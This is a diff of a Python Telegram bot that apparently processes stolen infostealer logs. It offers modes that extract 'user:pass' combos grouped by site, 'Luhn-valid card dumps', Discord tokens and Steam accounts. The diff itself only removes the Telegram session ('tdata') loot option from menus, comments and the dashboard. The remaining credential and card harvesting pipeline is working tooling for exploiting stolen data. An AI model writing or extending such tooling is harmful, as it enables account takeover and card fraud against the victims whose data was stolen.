@@ -67,7 +67,7 @@ _MODE_BUTTONS = [
     (COMBO_TARGETED_MODE, "Combo (targeted)", "\U0001f3af"),
     (COMBO_FULL_MODE, "Combo (full)", "\U0001f4e6"),
     (CC_MODE, "CC (Luhn)", "\U0001f4b3"),
-    (LOOT_MODE, "Loot (tdata/Discord/Steam)", "\U0001f4e6"),
+    (LOOT_MODE, "Loot (Discord/Steam)", "\U0001f4e6"),
 ]
 
 # Single-mode shortcut buttons on the main menu — each callback_data
@@ -640,8 +640,7 @@ def _mode_picker_text(domains: List[str]) -> str:
         f"\u2022 <b>Combo (full)</b> \u2014 <code>user:pass</code> "
         f"grouped by host, every domain in the logs\n"
         f"\u2022 <b>CC</b> \u2014 Luhn-valid card dumps\n"
-        f"\u2022 <b>Loot</b> \u2014 tdata (Telegram sessions), Discord "
-        f"tokens, Steam accounts"
+        f"\u2022 <b>Loot</b> \u2014 Discord tokens, Steam accounts"
     )
 
 
@@ -1246,7 +1245,7 @@ async def _process_job(
         # Important: when the user *also* picked ULP / combo / CC
         # modes those credentials are already covered by the main
         # extractor — so the loot pipeline only scans the
-        # tdata / Discord / Steam buckets. Otherwise the user would
+        # Discord / Steam buckets. Otherwise the user would
         # get duplicated (and possibly differently formatted) password
         # dumps inside loot_results.zip.
         if LOOT_MODE in output_modes and archive_path and os.path.exists(archive_path):
@@ -1255,11 +1254,10 @@ async def _process_job(
                     LOOT_DISCORD,
                     LOOT_PASSWORDS,
                     LOOT_STEAM,
-                    LOOT_TDATA,
                 )
 
                 loot_buckets: frozenset[str] = frozenset(
-                    {LOOT_TDATA, LOOT_DISCORD, LOOT_STEAM},
+                    {LOOT_DISCORD, LOOT_STEAM},
                 )
                 # Honour an explicit override from /loot (if a user
                 # somehow lands here with one) but default to the
@@ -1930,13 +1928,12 @@ def _format_loot_dashboard(progress: ExtractionProgress) -> str:
     if not counts and not active:
         return ""
     bucket_emoji = {
-        "tdata": "\U0001f4f1",
         "discord": "\U0001f3ae",
         "steam": "\U0001f3ae",
         "passwords": "\U0001f511",
     }
     lines: List[str] = ["\U0001f4e6 Loot scanners"]
-    for name in ("tdata", "discord", "steam", "passwords"):
+    for name in ("discord", "steam", "passwords"):
         if name not in counts and name != active:
             continue
         emoji = bucket_emoji.get(name, "\u2022")
